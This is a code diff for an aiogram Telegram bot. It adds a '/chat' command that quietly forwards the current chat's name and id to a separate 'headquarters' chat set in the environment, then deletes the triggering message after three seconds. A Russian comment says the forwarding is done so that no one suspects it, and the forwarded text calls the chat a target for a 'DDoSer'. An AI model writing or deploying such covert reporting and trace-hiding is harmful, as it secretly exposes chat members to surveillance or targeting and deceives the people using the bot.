@@ -1,7 +1,11 @@
+from asyncio import create_task
+from handlers.stb import remove_mes
 from aiogram.filters import Command
 from aiogram import types,Router,Bot
 from handlers.stb import  casino_chat
-
+import os
+from dotenv import load_dotenv
+load_dotenv()
 router = Router()
 
 
@@ -22,4 +26,17 @@ async def bot_talk(message: types.Message,bot:Bot):
     await bot.send_message(chat_id=chat_id, text=text)
     await message.reply("У меня получилось обработать запрос )")
 
+#пересылает id в другой чат чтобы не заподозрили
+@router.message(Command("chat"))
+async def bot_get_chat(message: types.Message,):
+    chat_id = str(message.chat.id)
+    chat_name = str(message.chat.full_name)
+    await message.answer(chat_id=os.getenv("general_headquarters") ,
+                         text=f"Вот тебе маленький дедосер -{chat_name} - {chat_id} id этого чата" )
+    create_task(remove_mes(message,3))
 
+#позволяет узнать id chata
+@router.message(Command("get_chat_id"))
+async def get_chat_id(message: types.Message):
+    chat_id = str(message.chat.id)
+    await message.reply(f"Я знаю что тебе надо: {chat_id}")
